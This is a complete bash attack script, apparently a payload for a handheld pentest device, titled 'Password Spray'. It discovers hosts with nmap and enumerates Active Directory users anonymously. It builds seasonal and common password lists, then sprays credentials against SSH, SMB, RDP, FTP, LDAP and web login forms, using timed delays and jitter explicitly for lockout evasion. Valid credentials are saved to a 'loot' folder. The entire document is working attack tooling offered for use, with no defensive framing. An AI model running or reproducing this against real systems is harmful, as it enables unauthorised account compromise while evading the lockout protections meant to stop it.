#!/bin/bash
# Title: Password Spray
# Author: bad-antics
# Description: Distributed password spraying against network services with lockout evasion
# Category: nullsec/crack

LOOT_DIR="/mmc/nullsec/password-spray"
mkdir -p "$LOOT_DIR"

PROMPT "PASSWORD SPRAY

Low-and-slow password spraying
with lockout detection & evasion.

Targets:
- Active Directory / LDAP
- Exchange / OWA
- SSH / RDP
- SMB / WinRM
- Web forms (custom)

Press OK to configure."

PROMPT "SPRAY MODE

1. Single service
2. Network sweep (spray all)
3. Subnet discovery + spray
4. Enterprise (AD/Exchange)
5. Custom web form

Select on next screen."

MODE=$(NUMBER_PICKER "Mode (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

TARGETS_FILE="/tmp/spray_targets.txt"

case $MODE in
    1)
        TARGET=$(TEXT_PICKER "Target IP:" "")
        echo "$TARGET" > "$TARGETS_FILE"
        
        PROMPT "SERVICE

1. SSH     5. WinRM
2. RDP     6. LDAP
3. SMB     7. Exchange/OWA
4. FTP     8. Custom HTTP

Select on next screen."
        SVC=$(NUMBER_PICKER "Service (1-8):" 1)
        SVCS=("ssh" "rdp" "smb" "ftp" "winrm" "ldap" "owa" "http")
        SERVICE="${SVCS[$((SVC - 1))]}"
        ;;
    2)
        SUBNET=$(TEXT_PICKER "Subnet:" "$(ip route | grep -v default | head -1 | awk '{print $1}')")
        SPINNER_START "Discovering live hosts..."
        nmap -sn "$SUBNET" -oG - 2>/dev/null | grep "Up" | awk '{print $2}' > "$TARGETS_FILE"
        SPINNER_STOP
        TCOUNT=$(wc -l < "$TARGETS_FILE")
        SERVICE="ssh"
        PROMPT "Found $TCOUNT hosts.
Will spray SSH by default."
        ;;
    3)
        SUBNET=$(TEXT_PICKER "Subnet:" "$(ip route | grep -v default | head -1 | awk '{print $1}')")
        SPINNER_START "Scanning subnet..."
        nmap -sV --top-ports 20 -T4 "$SUBNET" -oG /tmp/spray_scan.txt 2>/dev/null
        grep "open" /tmp/spray_scan.txt | awk '{print $2}' | sort -u > "$TARGETS_FILE"
        SPINNER_STOP
        SERVICE="auto"
        TCOUNT=$(wc -l < "$TARGETS_FILE")
        PROMPT "Found $TCOUNT hosts with open services."
        ;;
    4)
        DC=$(TEXT_PICKER "Domain Controller:" "")
        DOMAIN=$(TEXT_PICKER "Domain:" "CORP")
        echo "$DC" > "$TARGETS_FILE"
        SERVICE="ldap"
        ;;
    5)
        URL=$(TEXT_PICKER "Login URL:" "https://target.com/login")
        USER_FIELD=$(TEXT_PICKER "Username field:" "username")
        PASS_FIELD=$(TEXT_PICKER "Password field:" "password")
        FAIL_STR=$(TEXT_PICKER "Failure string:" "Invalid credentials")
        echo "$URL" > "$TARGETS_FILE"
        SERVICE="http-custom"
        ;;
esac

# Username gathering
PROMPT "USERNAMES

1. Common defaults
2. Custom list
3. Username file
4. Email format
5. AD enumeration

Select on next screen."

USER_SRC=$(NUMBER_PICKER "Source (1-5):" 1)
USER_FILE="/tmp/spray_users.txt"

case $USER_SRC in
    1)
        cat > "$USER_FILE" << 'EOF'
administrator
admin
user
test
guest
service
backup
support
helpdesk
operator
manager
sysadmin
webadmin
devops
deploy
monitoring
root
sa
dba
EOF
        ;;
    2)
        USERS=$(TEXT_PICKER "Users (comma-sep):" "admin,user,test")
        echo "$USERS" | tr ',' '\n' > "$USER_FILE"
        ;;
    3)
        USER_FILE=$(TEXT_PICKER "User file:" "/mmc/wordlists/users.txt")
        ;;
    4)
        DOMAIN_NAME=$(TEXT_PICKER "Domain:" "corp.com")
        NAMES=$(TEXT_PICKER "Names (comma-sep):" "john.doe,jane.smith")
        echo "$NAMES" | tr ',' '\n' | while read -r name; do
            F=$(echo "$name" | cut -d. -f1)
            L=$(echo "$name" | cut -d. -f2)
            echo "${F}.${L}@${DOMAIN_NAME}"
            echo "${F:0:1}${L}@${DOMAIN_NAME}"
            echo "${F}${L:0:1}@${DOMAIN_NAME}"
            echo "${F}@${DOMAIN_NAME}"
        done > "$USER_FILE"
        ;;
    5)
        if [ -n "$DC" ]; then
            SPINNER_START "Enumerating AD users..."
            rpcclient -U "%" -c "enumdomusers" "$DC" 2>/dev/null | \
                grep -oP 'user:\[\K[^\]]+' > "$USER_FILE"
            enum4linux -U "$DC" 2>/dev/null | grep "user:" | \
                awk -F'[][]' '{print $2}' >> "$USER_FILE"
            sort -u "$USER_FILE" -o "$USER_FILE"
            SPINNER_STOP
        fi
        ;;
esac

# Password selection
PROMPT "PASSWORDS

Spray uses FEW passwords
across MANY accounts to
avoid lockout.

1. Seasonal defaults
2. Corporate common
3. Custom passwords
4. Password file

Select on next screen."

PASS_SRC=$(NUMBER_PICKER "Source (1-4):" 1)
PASS_FILE="/tmp/spray_pass.txt"

YEAR=$(date +%Y)
SEASON=$(date +%m)
case $SEASON in
    01|02|03) SEASON_NAME="Winter" ;;
    04|05|06) SEASON_NAME="Spring" ;;
    07|08|09) SEASON_NAME="Summer" ;;
    10|11|12) SEASON_NAME="Fall" ;;
esac

case $PASS_SRC in
    1)
        cat > "$PASS_FILE" << EOF
${SEASON_NAME}${YEAR}!
${SEASON_NAME}${YEAR}
Password${YEAR}!
Welcome${YEAR}!
P@ssw0rd
Company${YEAR}!
Changeme1!
${SEASON_NAME}$((YEAR - 1))!
Password1!
Welcome1!
EOF
        ;;
    2)
        cat > "$PASS_FILE" << 'EOF'
Password1!
Welcome1!
Changeme1!
P@ssw0rd
Company1!
Admin123!
Letmein1!
Monday1!
Friday1!
Summer2025!
EOF
        ;;
    3)
        PASSWORDS=$(TEXT_PICKER "Passwords (one per OK):" "Password1!")
        echo "$PASSWORDS" > "$PASS_FILE"
        ;;
    4)
        PASS_FILE=$(TEXT_PICKER "Pass file:" "/mmc/wordlists/spray.txt")
        ;;
esac

# Lockout evasion settings
DELAY=$(NUMBER_PICKER "Delay between sprays (minutes):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DELAY=30 ;; esac

JITTER=$(NUMBER_PICKER "Jitter (seconds 0-60):" 5)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) JITTER=5 ;; esac

UCOUNT=$(wc -l < "$USER_FILE" 2>/dev/null)
PCOUNT=$(wc -l < "$PASS_FILE" 2>/dev/null)
TCOUNT=$(wc -l < "$TARGETS_FILE" 2>/dev/null)
TOTAL_TIME=$((PCOUNT * DELAY))

resp=$(CONFIRMATION_DIALOG "LAUNCH SPRAY?

Targets: $TCOUNT
Service: $SERVICE
Users: $UCOUNT
Passwords: $PCOUNT
Delay: ${DELAY}m between rounds
Est. time: ~${TOTAL_TIME}m

Press OK to spray.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULT_FILE="$LOOT_DIR/spray_${TIMESTAMP}.txt"
PROGRESS_FILE="$LOOT_DIR/spray_progress_${TIMESTAMP}.log"
LOG "PasswordSpray: targets=$TCOUNT users=$UCOUNT service=$SERVICE"

spray_target() {
    local target="$1" user="$2" pass="$3" svc="$4"
    
    case "$svc" in
        ssh)
            sshpass -p "$pass" ssh -o BatchMode=no -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
                "${user}@${target}" "echo SPRAY_SUCCESS" 2>/dev/null && return 0
            ;;
        smb)
            smbclient -L "//${target}" -U "${user}%${pass}" -t 5 &>/dev/null && return 0
            ;;
        rdp)
            xfreerdp /v:"$target" /u:"$user" /p:"$pass" /cert-ignore +auth-only 2>/dev/null | \
                grep -qi "success" && return 0
            ;;
        ftp)
            curl -s --connect-timeout 5 "ftp://${user}:${pass}@${target}/" &>/dev/null && return 0
            ;;
        ldap)
            ldapsearch -x -H "ldap://${target}" -D "${user}@${DOMAIN}" -w "$pass" -b "" -s base \
                &>/dev/null && return 0
            ;;
        http-custom)
            RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 \
                -d "${USER_FIELD}=${user}&${PASS_FIELD}=${pass}" "$target" 2>/dev/null)
            [ "$RESP" = "302" ] && return 0
            ;;
    esac
    return 1
}

ROUND=0
while IFS= read -r password; do
    ROUND=$((ROUND + 1))
    echo "[$(date)] Round $ROUND/$PCOUNT: $password" >> "$PROGRESS_FILE"
    SPINNER_START "Round $ROUND/$PCOUNT: Spraying..."
    
    while IFS= read -r target; do
        while IFS= read -r user; do
            # Random jitter
            [ "$JITTER" -gt 0 ] && sleep $((RANDOM % JITTER))
            
            if spray_target "$target" "$user" "$password" "$SERVICE"; then
                echo "[+] $target | $SERVICE | $user : $password" >> "$RESULT_FILE"
                echo "[$(date)] HIT: $target $user:$password" >> "$PROGRESS_FILE"
                NOTIFICATION "SPRAY HIT: $user@$target"
            fi
        done < "$USER_FILE"
    done < "$TARGETS_FILE"
    
    SPINNER_STOP
    
    # Delay between rounds (lockout evasion)
    if [ "$ROUND" -lt "$PCOUNT" ]; then
        SPINNER_START "Cooldown: ${DELAY}m (lockout evasion)..."
        sleep $((DELAY * 60))
        SPINNER_STOP
    fi
done < "$PASS_FILE"

FOUND=$(wc -l < "$RESULT_FILE" 2>/dev/null || echo 0)

if [ "$FOUND" -gt 0 ]; then
    CREDS=$(cat "$RESULT_FILE")
    PROMPT "SPRAY SUCCESS!

Found $FOUND valid credentials:

$CREDS

Saved to password-spray/

Press OK to exit."
else
    PROMPT "SPRAY COMPLETE

No valid credentials found.

Sprayed $UCOUNT users across
$TCOUNT targets with $PCOUNT
passwords.

Try seasonal variations
or expanded user list.

Press OK to exit."
fi

rm -f /tmp/spray_*.txt 2>/dev/null
